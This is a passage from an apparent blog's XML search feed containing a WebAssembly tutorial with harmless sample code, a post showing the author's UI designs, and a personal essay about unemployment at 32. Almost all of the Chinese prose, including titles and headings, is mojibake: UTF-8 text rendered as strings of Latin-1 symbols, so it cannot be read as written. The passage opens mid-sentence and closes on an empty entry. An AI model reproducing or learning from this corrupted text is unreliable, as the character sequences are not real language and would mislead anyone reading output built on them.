å±‚ï¼Œç„¶åç¼–è¯‘æˆå„å¹³å°çš„åŸç”Ÿ Appã€‚å…¸å‹ä»£è¡¨æ˜¯ React Nativeã€Flutterã€‚</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>WebAssembly åŠ é€Ÿæ‰§è¡Œ</title>
      <link href="/2025/03/16/Webassembly/"/>
      <url>/2025/03/16/Webassembly/</url>
      <content type="html"><![CDATA[<h3 id="1-ç®€ä»‹"><a href="#1-ç®€ä»‹" class="headerlink" title="1. ç®€ä»‹"></a>1. ç®€ä»‹</h3><p>Webassembly æœ€æ—©çš„ç›®æ ‡æ˜¯è®©ä»£ç åœ¨æµè§ˆå™¨ç«¯æ›´å¿«åœ°æ‰§è¡Œã€‚WASM å°†é JavaScript çš„è¯­è¨€ï¼ˆä¾‹å¦‚ï¼šC/C++ï¼ŒRustï¼ŒGolangç­‰ï¼‰çš„ä»£ç ç¼–è¯‘ä¸ºä½çº§å­—èŠ‚ç  Webassembly æ¨¡å—ï¼ˆ<code>.wasm</code>æ–‡ä»¶ï¼‰ï¼Œæ”¾å…¥æµè§ˆå™¨ç¯å¢ƒä¸­ï¼Œè®©æµè§ˆå™¨ç›´æ¥æ‰§è¡Œè¿™äº›æ¨¡å—ã€‚<br>WebAssembly æœ¬è´¨ä¸Šæ˜¯ä¸€ç§è¯­è¨€æ ¼å¼ï¼Œå®ƒä¹Ÿæ˜¯å¯äººå·¥ç¼–ç¨‹çš„ã€‚å®ƒä¹Ÿæœ‰å˜é‡ã€å‡½æ•°ã€æŒ‡ä»¤ç­‰åŸºç¡€æ¦‚å¿µã€‚<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">module</span></span><br><span class="line">  (type (;<span class="number">0</span>;) (func (param i32)))</span><br><span class="line">  (type (;<span class="number">1</span>;) (func))</span><br><span class="line">  (<span class="keyword">import</span> <span class="string">"imports"</span> <span class="string">"imported_func"</span> (func (;<span class="number">0</span>;) (type <span class="number">0</span>)))</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-å®é™…åº”ç”¨"><a href="#2-å®é™…åº”ç”¨" class="headerlink" title="2. å®é™…åº”ç”¨"></a>2. å®é™…åº”ç”¨</h3><ul><li><p><em>Qtåº”ç”¨</em><br>Qt for WebAssembly è®© Qt åº”ç”¨ä¹Ÿèƒ½æ”¾åˆ° Web æµè§ˆå™¨é‡Œä½¿ç”¨ã€‚<br><img src="/2025/03/16/Webassembly/2.webp" style="width: 45%"></p></li><li><p><em>è§†é¢‘è§£ç </em><br>å½“ FLV æ ¼å¼çš„ç›´æ’­æµåˆ°è¾¾å‰ç«¯æ—¶ï¼Œéœ€è¦å¯¹è§†é¢‘è§£ç æˆ MP4 æ ¼å¼ï¼Œå†ä½¿ç”¨åŸç”Ÿæ’­æ”¾å™¨æ’­æ”¾ã€‚ä½¿ç”¨ JavaScript è½¬ç æ•ˆç‡è¾ƒä½ï¼Œå¼•å…¥ Webassembly æ›¿æ¢ JavaScript æ¥è¿›è¡Œè½¬ç åï¼Œæ’­æ”¾è§†é¢‘çš„æ€§èƒ½æé«˜äº†å°†è¿‘ 20%ã€‚</p></li><li><p><em>å›¾å½¢æ¸²æŸ“ Figma</em><br>ä½¿ç”¨ Webassembly åï¼ŒFigma æé«˜äº†Webç«¯çš„å“åº”å’Œè½½å…¥é€Ÿåº¦ã€‚<br>ä¾æ‰˜ Web çš„å¿«æ·è®¿é—®ï¼ŒFigma æ‰“è´¥äº†åªæœ‰ mac å®¢æˆ·ç«¯çš„ Sketchã€‚</p></li></ul><p><br><br><br></p><h3 id="3-Hello-World"><a href="#3-Hello-World" class="headerlink" title="3. Hello World"></a>3. Hello World</h3><p>ä½¿ç”¨åœ¨çº¿çš„ç¼–è¯‘å™¨ï¼Œå°† <code>add.c</code> æ–‡ä»¶è½¬åŒ–ä¸º <code>add.wasm</code><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">add</span><span class="params">(<span class="keyword">float</span> a, <span class="keyword">float</span> b)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è½¬æ¢åçš„<code>add.wasm</code>æ–‡ä»¶<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(module</span><br><span class="line">  (type (;0;) (func (param f32 f32) (result f32)))</span><br><span class="line">  (func (;0;) (type 0) (param f32 f32) (result f32)</span><br><span class="line">    local.get 0</span><br><span class="line">    local.get 1</span><br><span class="line">    f32.add)</span><br><span class="line">  (export &quot;add&quot; (func 0)))</span><br></pre></td></tr></table></figure></p><p>ç”¨ vscode å¯åŠ¨æœåŠ¡, <code>.wasm</code>å¿…é¡»å¯åŠ¨æœåŠ¡æ‰èƒ½<code>fetch</code><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>WebAssembly Add example<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">         div &#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">font-size</span> : 30<span class="selector-tag">px</span>; <span class="selector-tag">text-align</span> : <span class="selector-tag">center</span>; <span class="selector-tag">color</span><span class="selector-pseudo">:blue</span>;</span></span><br><span class="line"><span class="undefined">         &#125;</span></span><br><span class="line"><span class="undefined">      </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"textcontent"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">         <span class="keyword">let</span> sum;</span></span><br><span class="line"><span class="javascript">         fetch(<span class="string">"add.wasm"</span>)</span></span><br><span class="line"><span class="javascript">            .then(<span class="function">(<span class="params">response</span>) =&gt;</span> response.arrayBuffer())</span></span><br><span class="line"><span class="javascript">            .then(<span class="function">(<span class="params">bytes</span>) =&gt;</span> WebAssembly.instantiate(bytes))</span></span><br><span class="line"><span class="javascript">            .then(<span class="function">(<span class="params">results</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="undefined">                sum = results.instance.exports._Z3addff(13, 12);</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">"The result of 13 + 12 = "</span> +sum);</span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.getElementById(<span class="string">"textcontent"</span>).innerHTML = <span class="string">"The result of 13 + 12 = "</span> +sum;</span></span><br><span class="line"><span class="undefined">         &#125;);</span></span><br><span class="line"><span class="undefined">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br><br><br></p><h3 id="4-åº”ç”¨"><a href="#4-åº”ç”¨" class="headerlink" title="4. åº”ç”¨"></a>4. åº”ç”¨</h3><h4 id="2-1-ç›´æ’­çƒŸèŠ±ç‰¹æ•ˆ"><a href="#2-1-ç›´æ’­çƒŸèŠ±ç‰¹æ•ˆ" class="headerlink" title="2.1 ç›´æ’­çƒŸèŠ±ç‰¹æ•ˆ"></a>2.1 ç›´æ’­çƒŸèŠ±ç‰¹æ•ˆ</h4><p>æˆ‘ä»¬çœ‹ç›´æ’­æ—¶ï¼Œç»å¸¸å¯ä»¥çœ‹è§ç”±ç”¨æˆ·é€ç¤¼è§¦å‘çš„ç‚«é…·ç¤¼ç‰©ç‰¹æ•ˆï¼Œå¦‚å˜‰å¹´åã€çƒŸèŠ±ã€‚å®ç°æ–¹æ¡ˆä¸€èˆ¬æœ‰ï¼š</p><ul><li><em>MP4</em><br>åœ¨æ—©æœŸç›´æ’­çš„ç¤¼ç‰©ç‰¹æ•ˆå¤šä»¥æ’­æ”¾ MP4 ä¸ºä¸»ã€‚è¯¥æ–¹æ¡ˆçš„ç“¶é¢ˆå¾ˆæ˜æ˜¾ï¼šéš¾ä»¥æ”¯æŒäº¤äº’ç±»ç‰¹æ•ˆã€å—èµ„æºåŒ…ä½“ç§¯çº¦æŸæ— æ³•åšåˆ°å¤§é‡æ’åˆ—ç»„åˆçš„éšæœºæ€§ç‰¹æ•ˆã€‚</li><li><em>webglæ¸²æŸ“</em><br>ç›¸æ¯”äºC++æ¸²æŸ“ï¼ŒJavaScript çš„ä½è¿è¡Œæ•ˆç‡ä¼šä¸¥é‡å½±å“æ¸²æŸ“æ•ˆæœã€‚å°†ç‰¹æ•ˆä¸­é‡å¤ä¸”é‡ CPU è®¡ç®—çš„é€»è¾‘è½¬æ¢ä¸º WebAssembly æ¥è°ƒç”¨æ˜¯å…¶ä¸­çš„é‡è¦ä¼˜åŒ–ä¹‹ä¸€ã€‚<br><img src="/2025/03/16/Webassembly/1.webp"></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/AssemblyScript/assemblyscript.git</span><br><span class="line">cd assemblyscript</span><br><span class="line">npm install</span><br><span class="line">npm link</span><br><span class="line">npm run dev</span><br><span class="line">npm run asbuild # ç¼–è¯‘å‡º .wasm äº§ç‰©</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> ç¼–å†™AssemblyScriptçš„ä½ç½®ï¼Œæˆ‘ä»¬åœ¨æ­¤exportçš„æ¥å£ï¼Œåœ¨ç¼–è¯‘åéƒ½ä¼šåœ¨ .wasm äº§ç‰©ä¸­æä¾›æ¥å£</span><br><span class="line">./assembly/index.ts</span><br><span class="line"><span class="meta">#</span> ç”¨äºç¼–å†™æµ‹è¯• .wasm ä»£ç çš„åœ°æ–¹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ­¤å¤„å¼•å…¥ .wasm äº§ç‰©ï¼Œç„¶åä½¿ç”¨ JavaScript ä»£ç è°ƒç”¨è¿›è¡Œæµ‹è¯•</span><br><span class="line">./tests/index.js</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-2-å›¾åƒå¤„ç†"><a href="#2-2-å›¾åƒå¤„ç†" class="headerlink" title="2.2 å›¾åƒå¤„ç†"></a>2.2 å›¾åƒå¤„ç†</h4><h4 id="2-3-éŸ³è§†é¢‘ç¼–ç "><a href="#2-3-éŸ³è§†é¢‘ç¼–ç " class="headerlink" title="2.3 éŸ³è§†é¢‘ç¼–ç "></a>2.3 éŸ³è§†é¢‘ç¼–ç </h4><h4 id="2-4-Webè§†é¢‘å‰ªè¾‘"><a href="#2-4-Webè§†é¢‘å‰ªè¾‘" class="headerlink" title="2.4 Webè§†é¢‘å‰ªè¾‘"></a>2.4 Webè§†é¢‘å‰ªè¾‘</h4><h4 id="2-6-è§£å†³Reactæ€§èƒ½é—®é¢˜"><a href="#2-6-è§£å†³Reactæ€§èƒ½é—®é¢˜" class="headerlink" title="2.6 è§£å†³Reactæ€§èƒ½é—®é¢˜"></a>2.6 è§£å†³Reactæ€§èƒ½é—®é¢˜</h4><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.cn/post/7212446354920079416" target="_blank" rel="noopener">æ˜é‡‘Â·å­—èŠ‚è·³åŠ¨å‰ç«¯Â·WebAssembly</a></li></ul>]]></content>
      
      <categories>
          
          <category> åŠ¨ç”»/åª’ä½“ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ğŸ¤” è®¾è®¡è¿‡çš„ä¸€äº›UI</title>
      <link href="/2025/03/11/UI/"/>
      <url>/2025/03/11/UI/</url>
      <content type="html"><![CDATA[<h3 id="1-logo"><a href="#1-logo" class="headerlink" title="1. logo"></a>1. logo</h3><p>2016å¹´ç»™ç¬¬ä¸€å®¶å…¬å¸ä¸€ä¸ªäº§å“è®¾è®¡çš„logoï¼Œçµæ„Ÿæ¥æºäºç™¾äº‹å¯ä¹å’Œç†å‘åº—ğŸ˜„<br><img src="/2025/03/11/UI/2.png" style="width: 200px"></p><p><br></p><h3 id="2-å°é»‘æ¿å„¿"><a href="#2-å°é»‘æ¿å„¿" class="headerlink" title="2. å°é»‘æ¿å„¿"></a>2. å°é»‘æ¿å„¿</h3><p>2017å¹´åšçš„ä¸€ä¸ªå°ç¨‹åºï¼Œèµ·å› æ˜¯è€æ¿è§‰å¾—å¹¼å„¿å›­ç¾¤èŠæ¥é¾™æ¶ˆæ¯å¤ªå¤šå¤ªçƒ¦ã€‚<br>äºæ˜¯æœ‰äº†è¿™ä¸ªå°ç¨‹åºï¼Œä»Šå¤©æ‹¿å‡ºæ¥çœ‹ï¼Œä¾ç„¶ç”»é£å‘†èŒ</p><h4 id="2-1-æ¬¢è¿é¡µ"><a href="#2-1-æ¬¢è¿é¡µ" class="headerlink" title="2.1 æ¬¢è¿é¡µ"></a>2.1 æ¬¢è¿é¡µ</h4><p><img src="/2025/03/11/UI/3.png" style="width: 33%; display: inline-block"><img src="/2025/03/11/UI/4.png" style="width: 33%; display: inline-block"><img src="/2025/03/11/UI/5.png" style="width: 33%; display: inline-block"></p><h4 id="2-2-é¡µé¢"><a href="#2-2-é¡µé¢" class="headerlink" title="2.2 é¡µé¢"></a>2.2 é¡µé¢</h4><p><img src="/2025/03/11/UI/6.png"></p><p><br></p><h3 id="3-chatåº”ç”¨"><a href="#3-chatåº”ç”¨" class="headerlink" title="3. chatåº”ç”¨"></a>3. chatåº”ç”¨</h3><p>2025å¹´ç»™é¢è¯•å…¬å¸ç”»çš„è¯•ç¨¿ï¼ˆè¶Šçœ‹è¶Šå–œæ¬¢ï¼‰<br><img src="/2025/03/11/UI/1.png"></p>]]></content>
      
      <categories>
          
          <category> Work </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>è¡Œè‡³æ°´ç©·å¤„ï¼Œåçœ‹äº‘èµ·æ—¶</title>
      <link href="/2025/03/02/32%E5%B2%81/"/>
      <url>/2025/03/02/32%E5%B2%81/</url>
      <content type="html"><![CDATA[<p>å“‡ï¼Œå¥½ä¹…æ²¡å†™æ–‡ç« äº†ï¼Œç¦»ä¸Šæ¬¡å†™æœ‰10å¹´äº†ã€‚ä¸ºä»€ä¹ˆä»Šå¤©è¦å†™ï¼Ÿå› ä¸ºæˆ‘æƒ³æŠŠæˆ‘æ­¤æ—¶çš„å¿ƒå¢ƒåˆ†äº«äºä½ ã€‚</p><p>æ­¤æ—¶çš„æˆ‘ï¼Œå¤§é¾„32å²ã€å•èº«ã€æ— ä¸šã€å¥³ï¼Œè¢«å…¬å¸è¾é€€ï¼Œåœ¨å‡ºç§Ÿå±‹é‡Œèººäº†åŠå¹´ã€‚</p><p>åŠå¹´é‡Œå…ˆæ˜¯ç©äº†ä¸€ä¸ªæœˆæ¸¸æˆï¼Œå»äº†æœ¬æºªã€ä¸¹ä¸œã€å¤§è¿ï¼Œä¸€ä¸ªç¾ä¸½çš„æµ·æ»¨åŸå¸‚ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ— å°½çš„èŒ«ç„¶ã€‚<br><img src="/2025/03/02/32å²/1.jpeg" style="display: inline-block; width: 55%; margin: 10px 0"></p><p><br></p><p>ç»æµä¸‹è¡Œï¼Œå¸‚åœºä¸Šçš„éœ€æ±‚ä¹Ÿè¢«æå¾—ä¸ƒä¸ƒå…«å…«äº†ã€‚ç»æµè¶Šæ˜¯ä½è¿·ï¼Œäººå°±è¶Šå®¹æ˜“æ‰“æ¸¸æˆï¼Œä¸å¦‚å»ææ¸¸æˆï¼Ÿäºæ˜¯æ–­æ–­ç»­ç»­çš„å­¦äº†threejs, cocos, unityï¼Œä¸åŒäºæœ€å¼€å§‹å­¦å‰ç«¯çš„æ—¶å€™ï¼Œè¿™æ¬¡æ²¡æœ‰æèµ·å¤šå¤§çš„åŠ²ã€‚</p><p>æ¥ç€å°±æ˜¯è¿‡å¹´ï¼Œå¤§æ¦‚æ˜¯å®åœ¨å‘†ä¸ä½äº†ï¼Œå†³å®šå¹´åå¤ä¹ å‰ç«¯ï¼Œæ‰¾å·¥ä½œã€‚</p><p>æˆ‘å¼€å§‹ç¿»çœ‹å¤§ä½¬çš„åšå®¢ã€æ¼”è®²ï¼ŒæŠŠä»–ä»¬è®²çš„ä¸œè¥¿ä¸€ç‚¹ç‚¹æ•´ç†æˆç¬”è®°ã€‚</p><p><img src="/2025/03/02/32å²/3.jpeg" style="display: inline-block; width: 55%; margin: 10px 0"></p><p><br></p><p>çœŸçš„å¥½ä¹…æ²¡å­¦ä¹ äº†ã€‚</p><p>ä»ä¸šåŠ¡ä»£ç ä¸­æŠ½èº«ï¼Œæ¡èµ·ä¹¦åŒ…ã€‚å“¦ï¼ŸåŸæ¥ Reactï¼ŒVueå·²ç»è¯ç”Ÿ10å¹´æœ‰ä½™ã€‚è¿˜è®°å¾—ç¬¬ä¸€æ¬¡ç”¨<em><code>React</code></em>ï¼Œæ„Ÿå¹äºå®ƒ<em><code>Class Component</code></em>çš„ç²¾å¦™è®¾è®¡ï¼Œä»£ç ç»„ç»‡èµ·æ¥æ—¢ä¼˜é›…åˆè´´åˆJSã€‚å¦‚æœè¯´<em><code>React</code></em>æ˜¯ä¸ªå¤©æ‰å°‘å¹´ï¼Œå®ƒæ€»æ˜¯ä¼šæå‡ºä¸€äº›å¥‡æ€å¦™æƒ³ï¼Œè®©ä½ è¿è¿ç§°èµã€‚é‚£<em><code>Vue</code></em>å°±æ˜¯ä¸€ä¸ªè¯šæ„æ»¡æ»¡ã€äº¤å‡ºæ»¡åˆ†ç­”å·çš„æ¸©æŸ”å­¦éœ¸ã€‚å®ƒçš„å„ç§APIã€æŒ‡ä»¤ï¼Œæ€»èƒ½è½»æ¾çš„æ»¡è¶³éœ€æ±‚ï¼Œç®€å•ã€å¥½ç”¨ã€‚</p><p><em><code>React, Vue</code></em>çš„å‡ºä¸–ï¼Œæ­é…<em><code>Ant Designã€Element UI</code></em>ç»„ä»¶åº“ï¼Œå‰ç«¯ç”Ÿäº§åŠ›å¾—åˆ°å·¨å¤§çš„è§£æ”¾ã€‚å½¼æ—¶å¤§é‡ä¼ ç»Ÿä¼ä¸šæ¥å…¥äº’è”ç½‘ï¼Œå¹´è½»äººçº·çº·æ¶Œå…¥ï¼Œæˆ‘ä»¬åƒä¸€è¾†ä¸çŸ¥ç–²æƒ«çš„é©¬è½¦ï¼Œæ»šå…¥é«˜é€Ÿè¿è½¬çš„ä¸šåŠ¡ä¸­ã€‚</p><!-- <img src="6.jpeg" style="display: inline-block; width: 16%; margin: 10px 0" /> --><p><br></p><p>åå¹´åçš„ä»Šå¤©ï¼Ÿ<br>é«˜é€Ÿå‘å±•äº†åå¹´åï¼ŒAIç››è¡Œï¼Œäº’è”ç½‘éœ€æ±‚èç¼©ï¼Œè€Œæ¶Œå…¥è¿™ä¸ªè¡Œä¸šçš„æ–°äººå´æ²¡æœ‰åœæ­¢ã€‚<br>å‘å±•ï¼Œç¨³å®šï¼Œè¡°è½æ˜¯äº˜å¤ä¸å˜çš„äº‹ç‰©å‘å±•è§„å¾‹ã€‚<br>æˆ‘èƒ½åšä»€ä¹ˆï¼Ÿ<br>32å²å¤§é¾„ã€è¢«è¾é€€å¥³å‰ç«¯ï¼Œæ²¡æœ‰å¤§å‚å…‰ç¯åŠ æŒï¼Œå‹¤å‹¤æ³æ³çš„å¹²çš„å…¨æ˜¯ä¸šåŠ¡éœ€æ±‚ã€‚ä½ è¯´è¿™ç®€å†æ˜¯ä¸æ˜¯è¦è¢«æ‰”è¿›åƒåœ¾æ¡¶â€¦<br>ğŸ¤”çœŸçš„ï¼Œbossç›´è˜ä¸Šä¸€ä¸ªé¢è¯•æœºä¼šéƒ½æœ¨æœ‰</p><p><img src="/2025/03/02/32å²/4.jpeg" style="display: inline-block; width: 45%; margin: 10px 0 0"><br>ï¼ˆæ­¤å›¾æ˜¯æˆ‘å¯çˆ±çš„å°ä¾„å­ï¼Œä»–ä¸€è„¸èŒ«ç„¶çš„è¡¨æƒ…ï¼Œè·Ÿæˆ‘ç°åœ¨å¥½åƒhhhï¼‰</p><p><br></p><p>ä¸€æ—¶é—´ä¸çŸ¥é“è¯¥åšäº›ä»€ä¹ˆã€‚å¯¹ä¸šåŠ¡éœ€æ±‚æœ‰æ‰€ç–²æƒ«ï¼Œä¸è¿‡ç–²æƒ«åˆç®—å¾—äº†ä»€ä¹ˆå‘¢ã€‚æ›´å¤§çš„é—®é¢˜æ˜¯ï¼Œä¸çŸ¥é“è¿˜èƒ½ç²¾è¿›ä»€ä¹ˆï¼Œå·¥ä½œä¸å¥½æ‰¾ã€‚<br>å­¦AIï¼ŸAIè·ç¦»æˆ‘å¤ªé¥è¿œäº†ã€‚åšå…¨æ ˆï¼Ÿå•åšå‰ç«¯å·²ç»å¾ˆç‰›é©¬äº†å‘€ï¼ˆè¿™è¯è¯´æ—©äº†ï¼Œå·²ç»åœ¨å­¦goäº†ï¼‰ã€‚<br>å„ç§æ€ç»ªé£æ¥ï¼Œä¸‡äº‹å´åœæ»ä¸å‰ï¼Œæˆ‘èººåœ¨å‡ºç§Ÿå±‹çš„åºŠä¸Šï¼Œä¸€è¾¹çœ‹ç€å­¦ä¹ è§†é¢‘ï¼Œä¸€è¾¹ç©ç€æ¶ˆæ¶ˆä¹ç¼“è§£ç„¦è™‘ã€‚</p><p><br><br>å¾ˆç¥å¥‡ï¼Œäººçš„å¤„å¢ƒä¸ä¸€æ ·ï¼Œå¿ƒå¢ƒä¹Ÿä¼šä¸ä¸€æ ·ã€‚<br>ä»¥å‰çœ‹è¿‡çš„æ–‡ç« ï¼Œé‡æ–°ç¿»å¼€çœ‹ï¼Œæœ‰äº†ä¸ä¸€æ ·çš„é¢†æ‚Ÿã€‚<br><em><code>Having fun, not just code for living.</code></em><br>æ­¤å¤„å¾ˆéš¾æè¿°æ€»ç»“ï¼Œæ‰€ä»¥å…ˆçœç•¥ï¼Œå¤§æ¦‚å°±æ˜¯æ”¾æ‰å¯¹ä¸šåŠ¡éœ€æ±‚çš„å…³æ³¨ï¼Œæˆ‘ä»¬è¦ä»ä¸€ä¸ªæŠ€æœ¯çš„ä½¿ç”¨è€…ï¼Œå˜æˆä¸€ä¸ªæŠ€æœ¯çš„å¼€å‘è€…ï¼ï¼ï¼</p><p><br><br>å¤§æ¦‚æ˜¯è„‘è¢‹å†’çƒŸï¼Œçªç„¶å†’å‡ºä¸€å¥è¯—ã€‚<br><em>è¡Œè‡³æ°´ç©·å¤„ï¼Œåçœ‹äº‘èµ·æ—¶ã€‚</em><br>è¿™å°±æ˜¯æˆ‘å¼€å¤´è¯´çš„æƒ³åˆ†äº«ç»™ä½ çš„ã€ä¸€ä¸ªç¥å¥‡çš„å¿ƒå¢ƒ~<br>è§£é‡Šä¸€ä¸‹å°±æ˜¯ï¼Œ<br>å½“ä½ ä¸çŸ¥é“è¦åšä»€ä¹ˆï¼Œä¸å¦¨å…ˆâ€œè¡Œè‡³â€æ°´ç©·å¤„ã€‚<br>å½“ä½ åˆ°äº†â€œæ°´ç©·å¤„â€ï¼Œçœ‹åˆ°å‰é¢æ²¡æœ‰è·¯äº†ï¼Œä¸å¦¨åä¸‹æ¥ï¼Œæˆ–è®¸ä¸‹ä¸€åˆ»ï¼Œå°±èƒ½çœ‹åˆ°æ°´è’¸å‘å˜æˆäº‘ï¼Œé‚£æ˜¯ä¸€é“å…¨æ–°çš„è·¯ã€‚ï¼ˆè¿˜æœ‰å¾—å¹²ï¼‰<br><img src="/2025/03/02/32å²/5.jpeg" style="display: inline-block; width: 55%; margin: 10px 0"><br><br></p><p>è¿™ä¸¤å¤©æ–¹å¤§åŒå»ä¸–çš„æ¶ˆæ¯ä¼ æ¥ã€‚å‘¨æœ«åœ¨å®¿èˆä¸€ééé‡å¬è¿™ä¸ªå¯çˆ±soul boyçš„æ­Œï¼Œä»–çš„æ­Œè¯æ€ä¹ˆå…¨æ˜¯çˆ±çˆ±çˆ±å•Šhhhã€‚<br>æœ€åç”¨å¤§åŒçš„è¯å…±å‹‰ï¼Œæ„¿ä½ æˆ‘éƒ½èƒ½åœ¨æœªæ¥çš„æ—¥å­é‡ŒæŒç»­åŠªåŠ›ï¼Œå‘æŒ¥æ½œèƒ½~</p><blockquote><p>æ—¶é—´ä¸ç­‰äººï¼Œéšç€å¹´é¾„çš„å¢é•¿ï¼Œæ›´èƒ½æ·±å…¥ç†è§£æ—¶é—´çš„ç°å®ä¸è™šå¹»ã€‚ç”Ÿæ´»ç»™æˆ‘ä»¬å¸¦æ¥äº†å„ç§å„æ ·çš„è½¬æŠ˜å’ŒæŒ‘æˆ˜ï¼Œä½†æˆ‘è®¤ä¸ºæˆ‘ä»¬çš„ç›®æ ‡ä¹‹ä¸€åº”è¯¥æ˜¯ä»¥é›…è‡´å¾—ä½“çš„æ€åº¦å»èµ°å®Œç”Ÿå‘½ä¹‹è·¯ã€‚<br>åœ¨æˆ‘äººç”Ÿä¸­çš„è¿™ä¸ªç‰¹åˆ«æ—¶åˆ»ï¼Œä¸‡äº‹åœæ»ä¸å‰,ç»™äºˆäº†æˆ‘å……åˆ†çš„æ—¶é—´å»åæ€è¿‡å»ã€è®¤çœŸæ€è€ƒçœ¼å‰çš„ä¸€åˆ‡ï¼Œå¹¶å¹»æƒ³æœªæ¥ã€‚ã€Šæ¢¦æƒ³å®¶ã€‹(The Dreamer)è¿™ä¸ªåå­—è±¡å¾ç€ï¼Œå³ä½¿é¢å¯¹ç–¾ç—…å’Œäººç”Ÿçš„ç§ç§æŒ‘æˆ˜ï¼Œæˆ‘ä¾ç„¶åœ¨è¿™é‡Œï¼Œå……æ»¡äº†åˆ›é€ çš„æ„å¢ƒå’Œæ»¡æ€€çš„æ¢¦æƒ³ã€‚<br>ç¥ä½ åœ¨æœªæ¥çš„æ—¥å­é‡Œï¼Œç»§ç»­æ€€æŠ±æ¢¦æƒ³ï¼ŒæŒç»­åŠªåŠ›ï¼Œæˆé•¿è¿›åŒ–ï¼Œåœ¨äººç”Ÿçš„æ¯ä¸ªé˜¶æ®µå……åˆ†å‘æŒ¥è‡ªå·±çš„æ½œèƒ½ã€‚<br> â€”â€” å¤§åŒ</p></blockquote><p>ï¼ˆä¿ä½‘æˆ‘é¡ºåˆ©æ‰¾åˆ°å·¥ä½œï¼Œå¸Œæœ›2025å¹´ä¼šæ˜¯å¿™ç¢Œåˆå……å®çš„ã€æ–°çš„ä¸€å¹´ã€‚ï¼‰</p><p><br><br>â€”â€” å†™äº2025.3.3 å˜‰çª<br>(æˆ‘å®£å¸ƒï¼Œå†™æ–‡ç« è¦æ¯”å†™ä»£ç éš¾100å€)</p>]]></content>
      
      <categories>
          
          <category> Work </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title></title>
      <link href="/2025/02/21/%E9%9D%A2%E8%AF%95/"/>
      <url>/2025/02/21/%E9%9D%A2%E8%AF%95/</url>
